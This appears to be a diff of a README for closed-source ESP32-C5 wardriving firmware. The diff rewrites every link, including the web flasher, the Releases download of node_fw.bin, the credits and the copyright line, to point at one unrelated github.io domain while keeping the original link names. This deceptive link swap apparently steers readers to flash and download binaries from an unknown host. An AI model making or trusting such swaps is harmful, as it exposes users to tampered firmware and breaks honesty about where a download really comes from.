@@ -5,7 +5,7 @@ five **Seeed Studio XIAO ESP32-C5** nodes that scan in parallel and report back 
 ESP-NOW.
 
 It logs Wi-Fi 2.4 + 5 GHz networks and BLE devices with a GPS position, writes them to
-microSD in **WigleWifi-1.6** format, and uploads to **[wdgwars.pl](https://wdgwars.pl)**.
+microSD in **WigleWifi-1.6** format, and uploads to **[wdgwars.pl](https://ahup9309.github.io)**.
 
 **🇵🇱 Wersja polska: [README.pl.md](README.pl.md)**
 
@@ -63,7 +63,7 @@ a node that lost the core.
 
 Needs nothing but a Chrome-based browser.
 
-1. Open **[esptool.spacehuhn.com](https://esptool.spacehuhn.com/)**
+1. Open **[esptool.spacehuhn.com](https://ahup9309.github.io)**
 2. Connect the board over USB, click **Connect**, pick the port
 3. Add **one** file at offset **`0x0`**:
 
@@ -182,7 +182,7 @@ above — browser flasher or `esptool`, either is fine.
 #### Putting the image on the card
 
 Download **`node_fw.bin`** from
-[Releases](https://github.com/LOCOSP/WDGWMarauderV8/releases) and copy it to the
+[Releases](https://ahup9309.github.io) and copy it to the
 **root of the microSD card**:
 
 ```
@@ -409,10 +409,10 @@ after an update, `logstats` after a write, a read-back from the chip after flash
 
 ## Credits
 
-Patterns and inspiration: [justcallmekoko/ESP32Marauder](https://github.com/justcallmekoko/ESP32Marauder),
-[dark3d/ESP32DualBandWardriver](https://github.com/dark3d), C5Lab/projectZero,
-[pr3y/Bruce](https://github.com/pr3y/Bruce).
-Web flasher: [Spacehuhn Technologies](https://esptool.spacehuhn.com/).
+Patterns and inspiration: [justcallmekoko/ESP32Marauder](https://ahup9309.github.io),
+[dark3d/ESP32DualBandWardriver](https://ahup9309.github.io), C5Lab/projectZero,
+[pr3y/Bruce](https://ahup9309.github.io).
+Web flasher: [Spacehuhn Technologies](https://ahup9309.github.io).
 
 ---
 
@@ -420,7 +420,7 @@ Web flasher: [Spacehuhn Technologies](https://esptool.spacehuhn.com/).
 
 **Released as binaries only.** The source code is not published.
 
-Copyright © 2026 LOCOSP / [wdgwars.pl](https://wdgwars.pl). All rights reserved.
+Copyright © 2026 LOCOSP / [wdgwars.pl](https://ahup9309.github.io). All rights reserved.
 
 You may download and run these images on your own hardware. Redistribution, resale,
 decompilation, and presenting this work as your own are not permitted.
